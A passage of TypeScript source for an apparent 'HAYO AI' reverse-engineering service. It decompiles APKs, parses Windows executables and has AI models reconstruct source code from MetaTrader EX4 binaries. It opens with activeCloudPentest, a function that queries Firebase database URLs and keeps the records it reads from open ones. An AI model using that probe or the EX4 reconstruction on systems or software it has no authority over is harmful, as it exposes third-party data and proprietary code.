/**
 * Reverse Engineer Service — HAYO AI
 * APK decompilation (ZIP extraction + Manifest parsing + JADX if available)
 * EXE analysis (PE headers + string extraction + .NET detection)
 * AI-powered code analysis
 */

import JSZip from "jszip";
import * as path from "path";
import * as fs from "fs";
import * as os from "os";
import { execSync, execFile } from "child_process";
import { promisify } from "util";
import { callOfficeAI, callPowerAI } from "../providers.js";

const execFileAsync = promisify(execFile);

export async function activeCloudPentest(firebaseUrls: string[]) {
  const findings: Array<{ target: string; status: string; data?: any }> = [];
  for (const dbUrl of firebaseUrls) {
    try {
      const response = await fetch(`${dbUrl}/.json?limitToFirst=1`);
      if (response.status === 200) {
        findings.push({ target: dbUrl, status: "VULNERABLE (Open Read)", data: await response.json() });
      } else {
        findings.push({ target: dbUrl, status: `SECURED (${response.status})` });
      }
    } catch { }
  }
  return findings;
}

// ════════════════════════════════════════
// Types
// ════════════════════════════════════════

export interface DecompiledFile {
  path: string;
  name: string;
  extension: string;
  size: number;
  content?: string;
  isBinary: boolean;
}

export interface VulnerabilityFinding {
  severity: "critical" | "high" | "medium" | "low" | "info";
  category: string;
  title: string;
  description: string;
  evidence: string[];
}

export interface DecompileResult {
  success: boolean;
  fileType: "apk" | "exe" | "unknown";
  totalFiles: number;
  totalSize: number;
  structure: FileTreeNode[];
  files: DecompiledFile[];
  manifest?: any;
  metadata?: any;
  zipBuffer?: Buffer;
  downloadId?: string;
  error?: string;
  analysisAvailable: boolean;
  vulnerabilities?: VulnerabilityFinding[];
}

export interface FileTreeNode {
  name: string;
  path: string;
  type: "file" | "folder";
  size?: number;
  children?: FileTreeNode[];
}

// ════════════════════════════════════════
// APK Decompilation
// ════════════════════════════════════════

export async function decompileAPK(apkBuffer: Buffer, fileName: string): Promise<DecompileResult> {
  const tmpDir = path.join(os.tmpdir(), `hayo-re-${Date.now()}`);
  const apkPath = path.join(tmpDir, "input.apk");
  const javaOutputDir = path.join(tmpDir, "java-source");

  try {
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.writeFileSync(apkPath, apkBuffer);

    const textExtensions = new Set([
      ".xml", ".txt", ".json", ".properties", ".cfg", ".ini",
      ".html", ".css", ".js", ".kt", ".java", ".smali",
      ".gradle", ".pro", ".md", ".yml", ".yaml", ".mf", ".sf",
    ]);

    const files: DecompiledFile[] = [];

    // Step 1: Unzip APK (APK = ZIP)
    const zip = await JSZip.loadAsync(apkBuffer);

    for (const [entryName, entry] of Object.entries(zip.files)) {
      if (entry.dir) continue;

      const ext = path.extname(entryName).toLowerCase();
      const isText = textExtensions.has(ext);
      let content: string | undefined;

      if (isText) {
        try {
          const data = await entry.async("uint8array");
          if (data.length < 500_000) {
            content = new TextDecoder("utf-8", { fatal: false }).decode(data);
          }
        } catch {
          content = undefined;
        }
      }

      const data = await entry.async("uint8array");
      files.push({
        path: entryName,
        name: path.basename(entryName),
        extension: ext,
        size: data.length,
        content,
        isBinary: !isText,
      });
    }

    // Step 2: Parse AndroidManifest.xml
    let manifest: any = null;
    const manifestEntry = zip.files["AndroidManifest.xml"];
    if (manifestEntry) {
      const manifestBuf = await manifestEntry.async("nodebuffer");
      manifest = parseAndroidManifestBasic(manifestBuf);
    }

    // Step 3: Try JADX decompilation (Java/Kotlin source)
    let jadxSuccess = false;
    try {
      const jadxBin = findJadx();

      if (jadxBin) {
        fs.mkdirSync(javaOutputDir, { recursive: true });
        execSync(
          `"${jadxBin}" --no-res --output-dir "${javaOutputDir}" "${apkPath}"`,
          { timeout: 120_000, stdio: "pipe" }
        );

        for (const jf of readDirRecursive(javaOutputDir)) {
          const relPath = path.relative(javaOutputDir, jf);
          const ext = path.extname(jf).toLowerCase();
          let content: string | undefined;
          try {
            const stat = fs.statSync(jf);
            if (stat.size < 500_000) content = fs.readFileSync(jf, "utf-8");
          } catch { /* skip */ }

          files.push({
            path: `java-source/${relPath}`,
            name: path.basename(jf),
            extension: ext,
            size: fs.existsSync(jf) ? fs.statSync(jf).size : 0,
            content,
            isBinary: false,
          });
        }
        jadxSuccess = true;
      }
    } catch (err: any) {
      console.warn("[RE] JADX failed:", err.message);
    }

    // Step 4: Build file tree
    const structure = buildFileTree(files);

    // Step 5: Build downloadable ZIP
    const outputZip = new JSZip();
    for (const f of files) {
      if (f.content) {
        outputZip.file(f.path, f.content);
      }
    }
    const report = generateAPKReport(fileName, files, manifest, jadxSuccess);
    outputZip.file("_HAYO_AI_REPORT.txt", report);
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    cleanupDir(tmpDir);

    return {
      success: true,
      fileType: "apk",
      totalFiles: files.length,
      totalSize: apkBuffer.length,
      structure,
      files: files.map(f => ({
        ...f,
        content: f.content ? f.content.substring(0, 50_000) : undefined,
      })),
      manifest,
      metadata: {
        jadxDecompiled: jadxSuccess,
        originalSize: formatBytes(apkBuffer.length),
        decompressedFiles: files.length,
        hasJavaSource: jadxSuccess,
        hasSmali: files.some(f => f.extension === ".smali"),
        hasResources: files.some(f => f.path.startsWith("res/")),
        hasNativeLibs: files.some(f => f.path.startsWith("lib/")),
        hasAssets: files.some(f => f.path.startsWith("assets/")),
      },
      zipBuffer,
      analysisAvailable: true,
    };
  } catch (err: any) {
    cleanupDir(tmpDir);
    return {
      success: false,
      fileType: "apk",
      totalFiles: 0,
      totalSize: 0,
      structure: [],
      files: [],
      error: `فشل تفكيك APK: ${err.message}`,
      analysisAvailable: false,
    };
  }
}

// ════════════════════════════════════════
// AI Power Decompile — hex dump + strongest model
// ════════════════════════════════════════

/**
 * Creates a readable hex dump (address | hex bytes | ASCII) from a Buffer.
 * Limits to maxBytes to stay within AI token limits.
 */
function generateHexDump(buf: Buffer, maxBytes = 131072): string {
  const limit = Math.min(buf.length, maxBytes);
  const lines: string[] = [];
  for (let offset = 0; offset < limit; offset += 16) {
    const slice = buf.slice(offset, Math.min(offset + 16, limit));
    const hex = Array.from(slice)
      .map(b => b.toString(16).padStart(2, "0"))
      .join(" ")
      .padEnd(47, " ");
    const ascii = Array.from(slice)
      .map(b => (b >= 0x20 && b <= 0x7e ? String.fromCharCode(b) : "."))
      .join("");
    lines.push(`${offset.toString(16).padStart(8, "0")}  ${hex}  |${ascii}|`);
  }
  if (buf.length > maxBytes) {
    lines.push(`\n... [تم اقتصار الـ hex dump على أول ${formatBytes(maxBytes)} من إجمالي ${formatBytes(buf.length)}]`);
  }
  return lines.join("\n");
}

/**
 * Sends the file's hex dump + extracted metadata to the most powerful AI model
 * available and asks it to perform deep binary analysis and code reconstruction.
 */
async function aiPowerDecompile(
  fileBuffer: Buffer,
  fileName: string,
  ext: string,
  existingStrings: string[]
): Promise<{ content: string; modelUsed: string }> {
  const hexDump = generateHexDump(fileBuffer, 150_000);
  const stringsPreview = existingStrings.slice(0, 300).join("\n");
  const fileSize = formatBytes(fileBuffer.length);

  let systemPrompt = "";
  let userMessage = "";

  if (ext === ".ex4") {
    systemPrompt = `أنت خبير متخصص في هندسة عكسية لملفات MQL4/EX4 الخاصة بمنصة MetaTrader 4.
لديك معرفة عميقة ببنية ملفات EX4 الثنائية:
- Header: 4 bytes magic، build number (uint16LE @ offset 4)، compile timestamp (uint32LE @ offset 12)
- String Table: نصوص UTF-8 وUTF-16LE تشمل أسماء دوال، رسائل، معاملات
- Property Block: تعريفات PROPERTY_INTEGER/DOUBLE/STRING (extern/input variables)  
- Function Table: opcodes استدعاء الدوال المدمجة في MQL4
- Code Section: MQL4 bytecode قابل للتحليل بالأنماط

مهمتك: تحليل hex dump والنصوص المستخرجة وإعادة بناء:
1. معاملات الإدخال (input/extern) مع أنواعها وقيمها الافتراضية
2. الدوال الرئيسية والمساعدة المكتشفة
3. منطق التداول (شروط الدخول/الخروج، إدارة المخاطر)
4. المؤشرات الفنية المستخدمة
5. كود MQ4 إعادة بناء كامل مع تعليقات تشرح كل جزء

اكتب الإجابة بالعربية مع الكود بالإنجليزية. كن محدداً ومفصّلاً قدر الإمكان.`;

    userMessage = `## معلومات الملف
الاسم: ${fileName}
الحجم: ${fileSize}
الامتداد: EX4 (MetaTrader 4 Compiled Expert Advisor/Indicator)

## النصوص المستخرجة من الملف (${existingStrings.length} نص)
\`\`\`
${stringsPreview}
\`\`\`

## Hex Dump (أول 150KB)
\`\`\`
${hexDump}
\`\`\`

الرجاء تحليل هذا الملف بعمق وإعادة بناء:
1. جدول المعاملات (inputs) مع أنواعها وقيمها
2. خريطة الدوال المكتشفة
3. منطق التداول وشروط الدخول/الخروج
4. كود MQ4 مُعاد بناؤه بأقصى دقة ممكنة`;

  } else if (ext === ".exe" || ext === ".dll") {
    systemPrompt = `أنت خبير متخصص في هندسة عكسية لملفات PE (Portable Executable) على Windows.
لديك معرفة عميقة ببنية PE format:
- DOS Header: "MZ" magic @ offset 0، PE offset @ offset 0x3C
- PE Header: "PE\\0\\0" signature، Machine type، NumberOfSections، TimeDateStamp
- Optional Header: ImageBase، AddressOfEntryPoint، SizeOfCode
- Section Table: .text (code)، .data، .rdata (strings)، .bss، .rsrc (resources)
- Import Table (IAT): DLLs والدوال المستوردة — يكشف وظائف البرنامج
- Export Table: الدوال المُصدَّرة (للـ DLL)
- .NET CLR Header (إذا كان .NET): يُمكّن تفكيكاً كاملاً باستخدام IL

مهمتك: تحليل hex dump وإعادة بناء:
1. معلومات PE header الكاملة
2. جدول الاستيراد (Import Table) — DLLs والـ APIs المستخدمة
3. جدول الصادرات (Export Table) للـ DLL
4. تحليل أقسام الكود (.text section)
5. استنتاج وظيفة البرنامج من الـ APIs والنصوص
6. كود C/C++ شبه مُعاد بناؤه مع تعليقات

اكتب الإجابة بالعربية مع الكود بالإنجليزية. كن محدداً ومفصّلاً.`;

    userMessage = `## معلومات الملف
الاسم: ${fileName}
الحجم: ${fileSize}
النوع: ${ext === ".dll" ? "DLL (Dynamic Link Library)" : "EXE (Windows Executable)"}

## النصوص المستخرجة من الملف (${existingStrings.length} نص)
\`\`\`
${stringsPreview}
\`\`\`

## Hex Dump (أول 150KB)
\`\`\`
${hexDump}
\`\`\`

الرجاء تحليل هذا الملف بعمق وإعادة بناء:
1. PE Headers الكاملة (Machine، Sections، EntryPoint، ImageBase)
2. Import Table (DLLs والـ Win32 APIs المستخدمة)
3. Export Table (إن وُجد)
4. استنتاج وظيفة البرنامج من البيانات
5. كود C++ شبه مُعاد بناؤه مع تعليقات توضيحية`;
  }

  return callPowerAI(systemPrompt, userMessage, 16000);
}

export async function analyzeEXE(exeBuffer: Buffer, fileName: string): Promise<DecompileResult> {
  try {
    const files: DecompiledFile[] = [];
    const peInfo = parsePEBasic(exeBuffer);
    const isDotNet = detectDotNet(exeBuffer);
    const strings = extractStrings(exeBuffer);

    files.push({
      path: "analysis/pe-headers.json",
      name: "pe-headers.json",
      extension: ".json",
      size: 0,
      content: JSON.stringify(peInfo, null, 2),
      isBinary: false,
    });

    const stringsContent = strings.join("\n");
    files.push({
      path: "analysis/extracted-strings.txt",
      name: "extracted-strings.txt",
      extension: ".txt",
      size: stringsContent.length,
      content: stringsContent,
      isBinary: false,
    });

    // PE Import/Export table parsing
    const { imports: peImports, exports: peExports } = parsePEImports(exeBuffer);
    if (peImports.length > 0) {
      const importContent = [
        `# جدول الاستيراد (Import Table) — ${peImports.length} DLL`,
        "",
        ...peImports.map(dll => `## ${dll.name}\n${dll.functions.map(f => `  - ${f}`).join("\n") || "  (لا دوال مسماة)"}`),
      ].join("\n");
      files.push({ path: "analysis/import-table.txt", name: "import-table.txt", extension: ".txt", size: importContent.length, content: importContent, isBinary: false });
    }
    if (peExports.length > 0) {
      const exportContent = `# جدول التصدير (Export Table) — ${peExports.length} دالة\n\n` + peExports.join("\n");
      files.push({ path: "analysis/export-table.txt", name: "export-table.txt", extension: ".txt", size: exportContent.length, content: exportContent, isBinary: false });
    }

    // Strings with system tool (better results)
    try {
      const tmpExePath = path.join(os.tmpdir(), `hayo-pe-${Date.now()}.bin`);
      fs.writeFileSync(tmpExePath, exeBuffer);
      const sysStrings = execSync(`strings -n 6 "${tmpExePath}"`, { timeout: 60000, maxBuffer: 10 * 1024 * 1024 }).toString();
      fs.unlinkSync(tmpExePath);
      if (sysStrings.length > stringsContent.length) {
        files.push({ path: "analysis/strings-full.txt", name: "strings-full.txt", extension: ".txt", size: sysStrings.length, content: sysStrings.substring(0, 200000), isBinary: false });
      }
    } catch { /* skip */ }

    if (isDotNet) {
      files.push({
        path: "analysis/dotnet-info.txt",
        name: "dotnet-info.txt",
        extension: ".txt",
        size: 0,
        content: [
          "هذا تطبيق .NET — يمكن تفكيكه بالكامل باستخدام أدوات متخصصة.",
          "",
          "أدوات مقترحة للتفكيك الكامل:",
          "• dnSpy (مجاني): https://github.com/dnSpy/dnSpy",
          "• ILSpy (مجاني): https://github.com/icsharpcode/ILSpy",
          "• dotPeek (مجاني من JetBrains): https://www.jetbrains.com/decompiler/",
          "",
          "يمكنك استخدام تحليل الذكاء الاصطناعي على ملف النصوص المستخرجة للحصول على معلومات مفيدة.",
        ].join("\n"),
        isBinary: false,
      });
    }

    const report = [
      `═══ تقرير تحليل EXE — HAYO AI ═══`,
      `الملف: ${fileName}`,
      `الحجم: ${formatBytes(exeBuffer.length)}`,
      `المعمارية: ${peInfo.architecture || "غير محدد"}`,
      `نوع التطبيق: ${isDotNet ? ".NET (قابل للتفكيك الكامل)" : "Native (C/C++)"}`,
      `تاريخ الترجمة: ${peInfo.compileDate || "غير معروف"}`,
      `عدد النصوص المستخرجة: ${strings.length}`,
      ``,
      `═══ معلومات PE Header ═══`,
      JSON.stringify(peInfo, null, 2),
    ].join("\n");

    files.push({
      path: "analysis/report.txt",
      name: "report.txt",
      extension: ".txt",
      size: report.length,
      content: report,
      isBinary: false,
    });

    // ── AI Power Decompile (أقوى نموذج) ──────────────────────────────
    let aiModelUsed = "";
    try {
      const { content: aiContent, modelUsed } = await aiPowerDecompile(
        exeBuffer, fileName, path.extname(fileName).toLowerCase() || ".exe", strings
      );
      aiModelUsed = modelUsed;
      if (aiContent) {
        const header = [
          `╔══════════════════════════════════════════════════╗`,
          `║  تحليل AI العميق — ${modelUsed}`,
          `║  الملف: ${fileName}`,
          `╚══════════════════════════════════════════════════╝`,
          "",
        ].join("\n");
        files.push({
          path: "ai-decompile/ai-deep-analysis.md",
          name: "ai-deep-analysis.md",
          extension: ".md",
          size: aiContent.length,
          content: header + aiContent,
          isBinary: false,
        });
      }
    } catch (aiErr: any) {
      console.warn("[analyzeEXE] AI Power Decompile failed:", aiErr.message);
      files.push({
        path: "ai-decompile/ai-error.txt",
        name: "ai-error.txt",
        extension: ".txt",
        size: 0,
        content: `تعذّر إجراء التحليل AI العميق: ${aiErr.message}`,
        isBinary: false,
      });
    }

    const outputZip = new JSZip();
    for (const f of files) {
      if (f.content) outputZip.file(f.path, f.content);
    }
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    return {
      success: true,
      fileType: "exe",
      totalFiles: files.length,
      totalSize: exeBuffer.length,
      structure: buildFileTree(files),
      files,
      metadata: {
        format: isDotNet ? ".NET Assembly" : `PE (${peInfo.isDLL ? "DLL" : "EXE"})`,
        originalSize: formatBytes(exeBuffer.length),
        fileName,
        isDotNet,
        architecture: peInfo.architecture || "unknown",
        stringsCount: strings.length,
        compileDate: peInfo.compileDate,
        importsCount: peImports.length,
        exportsCount: peExports.length,
        peInfo,
        aiModelUsed,
      },
      zipBuffer,
      analysisAvailable: true,
      vulnerabilities: scanVulnerabilities(files, "exe", strings.slice(0, 500)),
    };
  } catch (err: any) {
    return {
      success: false,
      fileType: "exe",
      totalFiles: 0,
      totalSize: 0,
      structure: [],
      files: [],
      error: `فشل تحليل EXE: ${err.message}`,
      analysisAvailable: false,
    };
  }
}

// ════════════════════════════════════════
// EX4 Analysis (MetaTrader 4 Expert Advisor)
// ════════════════════════════════════════

interface EX4Header {
  magic: string;
  version: number;
  build: number;
  dateCompiled: string;
  isExpert: boolean;
  isIndicator: boolean;
  isScript: boolean;
}

function parseEX4Header(buf: Buffer): EX4Header {
  // EX4 format: first 4 bytes = magic, then version/build info
  const magic = buf.slice(0, 4).toString("hex").toUpperCase();
  let version = 0, build = 0;
  // Build number often at offset 4-6 (little-endian uint16)
  if (buf.length > 6) {
    build = buf.readUInt16LE(4);
    version = buf.readUInt16LE(6);
  }
  // Type detection: check magic signature patterns
  // Standard EX4: starts with 0x44 or common MetaTrader headers
  const isExpert = magic.startsWith("44") || magic.startsWith("4D51"); // "MQ" in hex
  const isIndicator = magic.startsWith("4943") || build < 600; // heuristic
  const isScript = !isExpert && !isIndicator;

  // Try to read compile date from offset 12 (unix timestamp, optional)
  let dateCompiled = "غير معروف";
  try {
    if (buf.length > 16) {
      const ts = buf.readUInt32LE(12);
      if (ts > 1000000000 && ts < 2000000000) {
        dateCompiled = new Date(ts * 1000).toISOString().split("T")[0];
      }
    }
  } catch { /* ignore */ }

  return { magic, version, build, dateCompiled, isExpert, isIndicator, isScript };
}

function extractEX4Strings(buf: Buffer): string[] {
  const strings: string[] = [];
  const seen = new Set<string>();
  let i = 0;
  while (i < buf.length) {
    // Collect printable ASCII chars (min length 4)
    let start = i;
    while (i < buf.length && buf[i] >= 0x20 && buf[i] <= 0x7e) i++;
    const len = i - start;
    if (len >= 4) {
      const s = buf.slice(start, start + len).toString("ascii").trim();
      if (s && !seen.has(s)) {
        seen.add(s);
        strings.push(s);
      }
    }
    // Also check UTF-16LE (common in MQL4 strings)
    if (i < buf.length - 1 && buf[i] === 0 && i - start === 0) {
      // Scan UTF-16LE
      let u16start = i;
      let chars = "";
      while (i < buf.length - 1 && buf[i + 1] === 0 && buf[i] >= 0x20 && buf[i] <= 0x7e) {
        chars += String.fromCharCode(buf[i]);
        i += 2;
      }
      if (chars.length >= 4 && !seen.has(chars)) {
        seen.add(chars);
        strings.push(chars);
      } else {
        i = u16start + 1;
      }
    } else {
      i++;
    }
  }
  return strings;
}

function classifyEX4Strings(strings: string[]): {
  properties: Record<string, string>;
  functions: string[];
  indicators: string[];
  messages: string[];
  other: string[];
} {
  const properties: Record<string, string> = {};
  const functions: string[] = [];
  const indicators: string[] = [];
  const messages: string[] = [];
  const other: string[] = [];

  // MQL4 built-in property patterns
  const propPatterns = [
    "#property", "copyright", "link", "version", "description",
    "#define", "extern", "input", "sinput",
  ];
  // MQL4 function patterns
  const funcPatterns = [
    "OnInit", "OnDeinit", "OnTick", "OnCalculate", "OnTimer", "OnTrade",
    "OrderSend", "OrderClose", "OrderModify", "OrderSelect", "OrdersTotal",
    "iMA", "iRSI", "iMACD", "iBands", "iStochastic", "iCCI", "iADX",
    "Alert", "Print", "Comment", "MessageBox", "PlaySound",
    "AccountBalance", "AccountEquity", "AccountFreeMargin",
    "Bid", "Ask", "Digits", "Point", "Symbol", "Period",
  ];
  // Technical indicator names
  const indPatterns = [
    "MA", "RSI", "MACD", "Stochastic", "Bollinger", "ATR", "ADX",
    "EMA", "SMA", "WMA", "CCI", "DeMarker", "Envelopes", "Force",
    "Momentum", "MFI", "OsMA", "SAR", "RVI", "Williams",
  ];

  for (const s of strings) {
    const lower = s.toLowerCase();
    if (propPatterns.some(p => lower.includes(p.toLowerCase()))) {
      // Try to extract key=value
      const eq = s.indexOf(" ");
      if (eq > 0) {
        properties[s.substring(0, eq).trim()] = s.substring(eq).trim();
      } else {
        properties[s] = "";
      }
    } else if (funcPatterns.some(p => s.includes(p))) {
      functions.push(s);
    } else if (indPatterns.some(p => s.includes(p))) {
      indicators.push(s);
    } else if (s.includes(" ") && s.length > 8 && s.length < 200) {
      messages.push(s);
    } else {
      other.push(s);
    }
  }

  return { properties, functions, indicators, messages, other };
}

export async function analyzeEX4(ex4Buffer: Buffer, fileName: string): Promise<DecompileResult> {
  try {
    const files: DecompiledFile[] = [];
    const header = parseEX4Header(ex4Buffer);
    const strings = extractEX4Strings(ex4Buffer);
    const classified = classifyEX4Strings(strings);

    // Detect program type more accurately from strings
    const hasOnTick = strings.some(s => s.includes("OnTick") || s.includes("start"));
    const hasOnCalculate = strings.some(s => s.includes("OnCalculate") || s.includes("init"));
    let programType = "Expert Advisor (مستشار آلي)";
    if (strings.some(s => s.includes("OnCalculate"))) {
      programType = "Custom Indicator (مؤشر مخصص)";
    } else if (!hasOnTick && strings.some(s => s.includes("OnStart"))) {
      programType = "Script (سكريبت)";
    }

    // Build header info file
    const headerContent = [
      "══════════════════════════════════",
      "  معلومات ملف EX4 — HAYO AI",
      "══════════════════════════════════",
      `الملف: ${fileName}`,
      `الحجم: ${formatBytes(ex4Buffer.length)}`,
      `Magic Bytes: ${header.magic}`,
      `Build Number: ${header.build || "غير محدد"}`,
      `نوع البرنامج: ${programType}`,
      `تاريخ الترجمة: ${header.dateCompiled}`,
      `المنصة: MetaTrader 4 (MQL4)`,
      "",
      "── ملاحظة مهمة ──",
      "ملف EX4 هو ملف مترجم (Compiled Binary) من MetaTrader 4.",
      "لا يمكن استعادة الكود المصدري الكامل — لكن يمكن استخراج:",
      "• أسماء الدوال والمتغيرات",
      "• الرسائل والنصوص المضمّنة",
      "• إعدادات الخصائص (Properties)",
      "• أسماء المؤشرات المستخدمة",
      "",
      "لاستعادة الكود: ابحث عن نسخة .mq4 الأصلية",
      "أو جرّب: Decompiler EX4 to MQ4 (أدوات متخصصة خارجية)",
    ].join("\n");

    files.push({
      path: "info/header-info.txt",
      name: "header-info.txt",
      extension: ".txt",
      size: headerContent.length,
      content: headerContent,
      isBinary: false,
    });

    // Properties file
    const propsContent = Object.keys(classified.properties).length > 0
      ? Object.entries(classified.properties).map(([k, v]) => `${k}: ${v}`).join("\n")
      : "(لم يتم العثور على خصائص مضمّنة)";

    files.push({
      path: "analysis/properties.txt",
      name: "properties.txt",
      extension: ".txt",
      size: propsContent.length,
      content: [
        "══ خصائص البرنامج (Properties) ══",
        propsContent,
      ].join("\n"),
      isBinary: false,
    });

    // Functions found
    if (classified.functions.length > 0) {
      const funcsContent = classified.functions.join("\n");
      files.push({
        path: "analysis/functions-detected.txt",
        name: "functions-detected.txt",
        extension: ".txt",
        size: funcsContent.length,
        content: [
          "══ دوال MQL4 المكتشفة ══",
          `(تم العثور على ${classified.functions.length} دالة)`,
          "",
          funcsContent,
        ].join("\n"),
        isBinary: false,
      });
    }

    // Indicators used
    if (classified.indicators.length > 0) {
      const indContent = classified.indicators.join("\n");
      files.push({
        path: "analysis/indicators-used.txt",
        name: "indicators-used.txt",
        extension: ".txt",
        size: indContent.length,
        content: [
          "══ المؤشرات التقنية المستخدمة ══",
          `(تم اكتشاف ${classified.indicators.length} مؤشر)`,
          "",
          indContent,
        ].join("\n"),
        isBinary: false,
      });
    }

    // User messages
    if (classified.messages.length > 0) {
      const msgs = classified.messages.slice(0, 200).join("\n");
      files.push({
        path: "analysis/messages-strings.txt",
        name: "messages-strings.txt",
        extension: ".txt",
        size: msgs.length,
        content: [
          "══ الرسائل والنصوص المضمّنة ══",
          `(أول 200 نص)`,
          "",
          msgs,
        ].join("\n"),
        isBinary: false,
      });
    }

    // All extracted strings
    const allStrings = strings.slice(0, 2000).join("\n");
    files.push({
      path: "analysis/all-extracted-strings.txt",
      name: "all-extracted-strings.txt",
      extension: ".txt",
      size: allStrings.length,
      content: [
        `══ جميع النصوص المستخرجة (${strings.length} نص) ══`,
        "",
        allStrings,
      ].join("\n"),
      isBinary: false,
    });

    // MQL4 reconstruction hint
    const reconstructHint = [
      "══ محاولة إعادة بناء الهيكل (Skeleton) ══",
      "",
      `// ملف: ${fileName.replace(".ex4", ".mq4")} — هيكل مُعاد بناؤه بواسطة HAYO AI`,
      `// تحذير: هذا ليس الكود الأصلي — تم استنتاجه من البيانات المستخرجة`,
      "",
      `// نوع البرنامج: ${programType}`,
      "",
      ...Object.entries(classified.properties).map(([k, v]) => `#property ${k} "${v}"`),
      "",
      "//+------------------------------------------------------------------+",
      "//| دوال مكتشفة:                                                      |",
      "//+------------------------------------------------------------------+",
      ...classified.functions.slice(0, 30).map(f => `// ${f}`),
      "",
      "//+------------------------------------------------------------------+",
      "//| مؤشرات مستخدمة:                                                   |",
      "//+------------------------------------------------------------------+",
      ...classified.indicators.slice(0, 20).map(ind => `// ${ind}`),
    ].join("\n");

    files.push({
      path: "reconstruction/skeleton.mq4",
      name: "skeleton.mq4",
      extension: ".mq4",
      size: reconstructHint.length,
      content: reconstructHint,
      isBinary: false,
    });

    // ── AI Power Decompile (أقوى نموذج لإعادة البناء الكامل) ────────────
    let aiModelUsed = "";
    try {
      const { content: aiContent, modelUsed } = await aiPowerDecompile(
        ex4Buffer, fileName, ".ex4", strings
      );
      aiModelUsed = modelUsed;
      if (aiContent) {
        const header = [
          `╔══════════════════════════════════════════════════╗`,
          `║  إعادة بناء AI العميق — ${modelUsed}`,
          `║  الملف: ${fileName}`,
          `╚══════════════════════════════════════════════════╝`,
          "",
        ].join("\n");
        // Extract code block if present (the AI may return MQ4 code in a ```mq4 block)
        const mq4Match = aiContent.match(/```(?:mq4|mql4|cpp|c\+\+)?\n([\s\S]+?)```/i);
        const mq4Code = mq4Match ? mq4Match[1] : aiContent;

        files.push({
          path: "ai-decompile/ai-reconstructed.mq4",
          name: "ai-reconstructed.mq4",
          extension: ".mq4",
          size: mq4Code.length,
          content: `// ══ إعادة بناء AI (${modelUsed}) ══\n// الملف الأصلي: ${fileName}\n\n` + mq4Code,
          isBinary: false,
        });
        files.push({
          path: "ai-decompile/ai-full-analysis.md",
          name: "ai-full-analysis.md",
          extension: ".md",
          size: aiContent.length,
          content: header + aiContent,
          isBinary: false,
        });
      }
    } catch (aiErr: any) {
      console.warn("[analyzeEX4] AI Power Decompile failed:", aiErr.message);
      files.push({
        path: "ai-decompile/ai-error.txt",
        name: "ai-error.txt",
        extension: ".txt",
        size: 0,
        content: `تعذّر إجراء التحليل AI العميق: ${aiErr.message}`,
        isBinary: false,
      });
    }

    // Build ZIP
    const outputZip = new JSZip();
    for (const f of files) {
      if (f.content) outputZip.file(f.path, f.content);
    }
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    return {
      success: true,
      fileType: "exe",  // reuse exe display type for frontend
      totalFiles: files.length,
      totalSize: ex4Buffer.length,
      structure: buildFileTree(files),
      files,
      metadata: {
        originalSize: formatBytes(ex4Buffer.length),
        fileName,
        programType,
        build: header.build,
        dateCompiled: header.dateCompiled,
        stringsCount: strings.length,
        functionsCount: classified.functions.length,
        indicatorsCount: classified.indicators.length,
        ex4Magic: header.magic,
        aiModelUsed,
      },
      zipBuffer,
      analysisAvailable: true,
    };
  } catch (err: any) {
    return {
      success: false,
      fileType: "exe",
      totalFiles: 0,
      totalSize: 0,
      structure: [],
      files: [],
      error: `فشل تحليل EX4: ${err.message}`,
      analysisAvailable: false,
    };
  }
}

// ════════════════════════════════════════
// AI Analysis
// ════════════════════════════════════════

export async function analyzeWithAI(
  code: string,
  fileName: string,
  analysisType: "explain" | "security" | "logic" | "full",
  _question?: string,
  _files?: any[],
  _manifest?: any
): Promise<string> {
  const prompts: Record<string, string> = {
    explain: `أنت خبير هندسة عكسية. حلل هذا الكود المفكك من ملف "${fileName}" واشرح بالتفصيل:
1. ماذا يفعل هذا الكود؟
2. ما هي الوظائف الرئيسية؟
3. ما هي المكتبات المستخدمة؟
4. كيف يعمل التطبيق بشكل عام؟
اشرح بلغة بسيطة ومفهومة.`,

    security: `أنت خبير أمن سيبراني. حلل هذا الكود المفكك من ملف "${fileName}" وابحث عن:
1. 🔴 ثغرات أمنية حرجة
2. 🟡 مفاتيح API أو كلمات سر مكشوفة (hardcoded secrets)
3. 🟡 اتصالات شبكة غير مشفرة
4. 🟡 صلاحيات خطيرة
5. 🟢 توصيات لتحسين الأمان
صنّف كل نتيجة حسب خطورتها.`,

    logic: `أنت خبير هندسة برمجيات. حلل هذا الكود المفكك من ملف "${fileName}":
1. ارسم خريطة المنطق البرمجي (flow)
2. حدد نقاط الدخول (entry points)
3. حدد استدعاءات API الخارجية
4. حدد آليات تخزين البيانات
5. حدد آليات المصادقة (authentication)
قدم التحليل بشكل منظم.`,

    full: `أنت خبير هندسة عكسية متقدم. قدم تحليلاً شاملاً لهذا الكود المفكك من ملف "${fileName}":

📋 **نظرة عامة:** ماذا يفعل التطبيق؟
🏗️ **البنية:** كيف منظم الكود؟ ما هي الأنماط المستخدمة؟
🔌 **الاتصالات:** أي APIs أو خوادم يتصل بها؟
💾 **البيانات:** كيف يخزن البيانات؟
🔐 **الأمان:** ثغرات؟ مفاتيح مكشوفة؟ صلاحيات خطيرة؟
📦 **المكتبات:** ما المكتبات الخارجية المستخدمة؟
⚠️ **ملاحظات:** أي شيء مثير للاهتمام أو مشبوه؟

قدم التحليل بالعربية بشكل مفصل ومنظم.`,
  };

  const systemPrompt = "أنت خبير هندسة عكسية وأمن سيبراني. تحلل الأكواد المفككة بدقة عالية وتقدم نتائج مفصلة ومنظمة. أجب بالعربية.";

  const result = await callOfficeAI(
    systemPrompt,
    `${prompts[analysisType] || prompts.full}\n\nالكود:\n\`\`\`\n${code.substring(0, 30_000)}\n\`\`\``,
    8192,
    "claude-sonnet-4-6"
  );

  return result;
}

// ════════════════════════════════════════
// Helper Functions
// ════════════════════════════════════════

function parseAndroidManifestBasic(buf: Buffer): any {
  try {
    const str = buf.toString("utf-8");
    const packageMatch = str.match(/package="([^"]+)"/);
    const versionMatch = str.match(/versionName="([^"]+)"/);
    const permRegex = /android\.permission\.([A-Z_]+)/g;
    const permissions: string[] = [];
    let m;
    while ((m = permRegex.exec(str)) !== null) {
      if (!permissions.includes(m[1])) permissions.push(m[1]);
    }
    return {
      packageName: packageMatch?.[1] || "غير محدد",
      versionName: versionMatch?.[1] || "غير محدد",
      permissions,
    };
  } catch {
    try {
      const strings = extractUTF16Strings(buf);
